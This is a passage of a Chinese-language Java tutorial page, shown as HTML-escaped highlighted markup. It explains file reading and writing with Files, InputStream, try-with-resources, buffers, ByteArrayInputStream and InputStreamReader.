&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 写入文本并指定编码:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#d88200">&amp;#34;文本内容...&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ISO_8859_1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 按行写入文本:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">lines&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">lines&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意，&lt;code>Files&lt;/code>提供的读写方法，受内存限制，只能读写小文件，例如配置文件等，不可一次读入几个G的大文件。读写大型文件仍然要使用文件流，每次只读写一部分文件内容&lt;/p>
&lt;h3 id="字节流读写">字节流读写&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>InputStream&lt;/code>代表输入字节流，&lt;code>OuputStream&lt;/code>代表输出字节流，以byte为最小单位&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>Reader&lt;/code>和&lt;code>Writer&lt;/code>表示字符流(读写字符，并且字符不全是单字节表示的ASCII字符)，以char为最小单位&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果数据源不是文本，就只能使用&lt;code>InputStream&lt;/code>，如果数据源是文本，使用Reader更方便一些&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>InputStream&lt;/code>并不是一个接口，而是一个抽象类，它是所有输入流的超类，这个抽象类定义的一个最重要的方法就是&lt;code>int read()&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个方法会读取输入流的下一个字节，并返回字节表示的&lt;code>int&lt;/code>值（0~255），如果已读到末尾，返回&lt;code>-1&lt;/code>表示不能继续读取了&lt;/p>
&lt;ul>
&lt;li>&lt;code>FileInputStream&lt;/code>是&lt;code>InputStream&lt;/code>的一个子类，从文件流中读取数据&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.md&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#f92672">(;;){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>所有与IO操作相关的代码都必须正确处理&lt;code>IOException&lt;/code>，可以用&lt;code>try ... finally&lt;/code>来保证&lt;code>InputStream&lt;/code>在无论是否发生IO错误的时候都能够正确地关闭&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">())!=-&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">prinln&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">finally&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">!=&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>java7之后可以用更简单的try(resource)&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#75715e">// 编译器在此自动为我们写入finally并调用close()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>实际上，编译器并不会特别地为&lt;code>InputStream&lt;/code>加上自动关闭。编译器只看&lt;code>try(resource = ...)&lt;/code>中的对象是否实现了&lt;code>java.lang.AutoCloseable&lt;/code>接口，如果实现了，就自动加上&lt;code>finally&lt;/code>语句并调用&lt;code>close()&lt;/code>方法。&lt;code>InputStream&lt;/code>和&lt;code>OutputStream&lt;/code>都实现了这个接口，因此都可以用在&lt;code>try(resource)&lt;/code>中&lt;/p>
&lt;ul>
&lt;li>&lt;code>InputStream&lt;/code>提供了两个重载方法来支持读取多个字节&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>int read(byte[] b)：读取若干字节并填充到byte[]数组，返回读取的字节数
int read(byte[] b, int off, int len)：指定byte[]数组的偏移量和最大填充数
&lt;/code>&lt;/pre>&lt;p>利用上述方法一次读取多个字节时，需要先定义一个&lt;code>byte[]&lt;/code>数组作为缓冲区，&lt;code>read()&lt;/code>方法会尽可能多地读取字节到缓冲区， 但不会超过缓冲区的大小。&lt;code>read()&lt;/code>方法的返回值不再是字节的&lt;code>int&lt;/code>值，而是返回实际读取了多少个字节。如果返回&lt;code>-1&lt;/code>，表示没有更多的数据了&lt;/p>
&lt;p>利用缓冲区一次读取多个字节的代码如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 定义1000个字节大小的缓冲区:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">1000&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 读取到缓冲区
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;read &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34; bytes.&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>除&lt;code>FileInputStream&lt;/code>以外还有&lt;code>ByteArrayInputStream&lt;/code>可以在内存中模拟一个&lt;code>InputStream&lt;/code>，实际上是把一个&lt;code>byte[]&lt;/code>数组在内存中变成一个&lt;code>InputStream&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">72&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">101&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">108&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">108&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">111&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">33&lt;/span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>OutputStream&lt;/code>还提供了一个&lt;code>flush()&lt;/code>方法，它的目的是将缓冲区的内容真正输出到目的地&lt;/li>
&lt;/ul>
&lt;h3 id="字符流读写">字符流读写&lt;/h3>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">InputStream&lt;/th>
&lt;th style="text-align:left">Reader&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">字节流，以&lt;code>byte&lt;/code>为单位&lt;/td>
&lt;td style="text-align:left">字符流，以&lt;code>char&lt;/code>为单位&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">读取字节（-1，0~255）：&lt;code>int read()&lt;/code>&lt;/td>
&lt;td style="text-align:left">读取字符（-1，0~65535）：&lt;code>int read()&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">读到字节数组：&lt;code>int read(byte[] b)&lt;/code>&lt;/td>
&lt;td style="text-align:left">读到字符数组：&lt;code>int read(char[] c)&lt;/code>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>除了特殊的&lt;code>CharArrayReader&lt;/code>和&lt;code>StringReader&lt;/code>，普通的&lt;code>Reader&lt;/code>实际上是基于&lt;code>InputStream&lt;/code>构造的，因为&lt;code>Reader&lt;/code>需要从&lt;code>InputStream&lt;/code>中读入字节流（&lt;code>byte&lt;/code>），然后，根据编码设置，再转换为&lt;code>char&lt;/code>就可以实现字符流。如果我们查看&lt;code>FileReader&lt;/code>的源码，它在内部实际上持有一个&lt;code>FileInputStream&lt;/code>。&lt;/p>
&lt;p>既然&lt;code>Reader&lt;/code>本质上是一个基于&lt;code>InputStream&lt;/code>的&lt;code>byte&lt;/code>到&lt;code>char&lt;/code>的转换器，那么，如果我们已经有一个&lt;code>InputStream&lt;/code>，想把它转换为&lt;code>Reader&lt;/code>，是完全可行的。&lt;code>InputStreamReader&lt;/code>就是这样一个转换器，它可以把任何&lt;code>InputStream&lt;/code>转换为&lt;code>Reader&lt;/code>。示例代码如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 持有InputStream:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 变换为Reader:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Reader&lt;/span> &lt;span style="color:#111">reader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InputStreamReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;UTF-8&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>构造&lt;code>InputStreamReader&lt;/code>时，我们需要传入&lt;code>InputStream&lt;/code>，还需要指定编码，就可以得到一个&lt;code>Reader&lt;/code>对象。上述代码可以通过&lt;code>try (resource)&lt;/code>更简洁地改写如下：&lt;/p>
